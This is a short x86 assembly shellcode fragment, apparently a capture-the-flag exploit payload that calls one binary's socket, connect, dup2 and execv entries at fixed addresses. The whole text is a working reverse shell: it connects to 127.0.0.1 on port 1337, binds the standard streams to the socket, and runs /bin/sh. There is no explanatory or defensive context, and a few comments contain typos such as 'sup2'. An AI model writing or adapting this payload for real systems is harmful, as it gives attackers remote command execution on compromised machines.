	and esp ,0xfffffff0
	sub esp, 512

    #socket
    push	0                      # IPPROTO_IP
	push	1                      # SOC_STREAM
	push	2                      # AF_INET
    push 0x8048730                 # socket@plt
	pop ebx 
	call ebx

    mov edi, eax                   # sock_fd

    #serv_addr init
    push 0x0100007f                # ip in network order
    push word ptr 0x3905           # port in network order
    push word ptr 2                # AF_INET
    mov eax, esp                   # struct's pointer

    #connect
	push	16                      # struct's size
	push	eax                     # struct's pointer
	push	edi                     # sock_fd
    push 0x8048750                  # connect@plt
	pop ebx
	call	ebx

    #dup2(sock_fd, 0)
	push	0                       # STDIN
	push	edi                     # sock_fd
    push 0x8048600                  # sup2@plt
	pop ebx
	call	ebx

    #dup2(sock_fd, 1)
	push	1                       # STDOUT
	push	edi                     # sock_fd
    push 0x8048600                  # sup2@plt
	pop ebx
	call	ebx

    #dup2(sock_fd, 2)
	push	2                       # STDERR
	push	edi                     # sock_fd
    push 0x8048600                  # sup2@plt
	pop ebx
	call	ebx

    #execv
    push 0                          # NULL
	jmp _WANT_BIN_BASH
_GOT_BIN_BASH:                      
    push 0x80486d0                  # execv@plt
	pop ebx
	call	ebx
_WANT_BIN_BASH:
    call _GOT_BIN_BASH
    .STRING "/bin/sh"                # /bin/sh